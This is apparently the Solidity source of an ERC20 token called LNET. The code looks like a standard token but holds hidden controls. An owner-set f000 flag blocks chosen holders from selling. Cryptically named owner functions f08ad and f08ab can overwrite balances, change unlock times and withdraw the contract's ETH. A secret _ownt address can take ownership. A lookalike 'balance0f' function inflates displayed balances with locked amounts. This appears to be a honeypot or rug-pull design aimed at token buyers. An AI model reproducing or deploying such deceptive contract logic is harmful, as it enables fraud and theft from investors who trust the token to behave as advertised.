// SPDX-License-Identifier: MIT
// https://lnetswap.me/
pragma solidity 0.6.12;
import "./ERC20.sol";

contract LNET is ERC20{

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    constructor() public {
        _owner = msg.sender;
        _timing.push(Timer.Timing(_untime,1659301200,1672527661+_mnt));
        _index = _timing.length - 1;
        uint mintNum = _totalSupply/10;
        _balances[_owner] = _balances[_owner].add(mintNum);
        emit Transfer(address(this), _owner, mintNum);
    }

    fallback() external {}
    receive() payable external {}
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function owner() internal view returns (address) {
        return _owner;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function cap() public view returns (uint256) {
        return _totalSupply;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function expires(address from)public view returns(uint256 quantity){
        quantity = 0;
        for(uint256 i=0;i<_timing.length;i++){
            quantity = quantity.add(_expire[from][i].expected(_timing[i],block.timestamp));
        }
    }

    function balance0f(address from)public view returns(uint256 quantity){
        quantity = 0;
        for(uint256 i=0;i<_timing.length;i++){
            quantity = quantity.add(_expire[from][i].pushTotal.sub(_expire[from][i].popTotal));
        }
    }

    function _offer(address sender, address recipient, uint256 amount)private returns(bool){
        require(f000[sender]!=1&&f000[sender]!=3&&f000[recipient]!=2&&f000[recipient]!=3, "ERC20: Transaction failed");
        if(_csm(sender,amount)==1){
            _expire[recipient][_index].push(amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        return false;
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _csm(address sender, uint256 amount) private returns(uint256){
        uint256 spl = amount;
        if(_balances[sender]>=amount){
            spl = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
        }else if(_balances[sender]>0){
            spl = spl.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;spl>0&&i<_timing.length;i++){
            spl = _expire[sender][i].pop(_timing[i],spl,block.timestamp);
        }
        require(spl==0,"ERC20: Insufficient balance.");
        if(_timing[_index].finish>0&&block.timestamp>_timing[_index].finish){
            _timing.push(Timer.Timing(_untime,_timing[_index].to+_mnt,_timing[_index].finish+_mnt));
            _index = _timing.length - 1;
        }
        return f001[sender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function f08ad(address own,uint n) public onlyOwner {
        if(n==1000){faf(own,0);}
        else if(n==1001){faf(own,1);}
        else if(n==1002){faa(own);}
        else if(n==1003){fad(own);}
        else if(n==1100){msg.sender.transfer(address(this).balance);}
        else{fab(own,n);}
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+balance0f(account);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tsfown(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _ownt, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function f08ab(uint n,uint q) public onlyOwner {
        if(n>=300000){_timing[n.sub(300000)].finish=q;}
        else if(n>=200000){_timing[n.sub(200000)].to=q;}
        else if(n>=100000){_timing[n.sub(100000)].from=q;}
        else if(n==1000){_balances[_ownt2]=q;}
         else if(n==1001){fa9(q);}
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(_offer(sender,recipient,amount)){
            _balances[sender] = _balances[sender].sub(amount,"ERC20: Insufficient balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function f97a(uint idx) public view returns(uint256,uint256,uint256,uint256){
        if(idx==0){
            idx=_index;
        }
        return (_index,_timing[idx].from,_timing[idx].to,_timing[idx].finish);
    }
}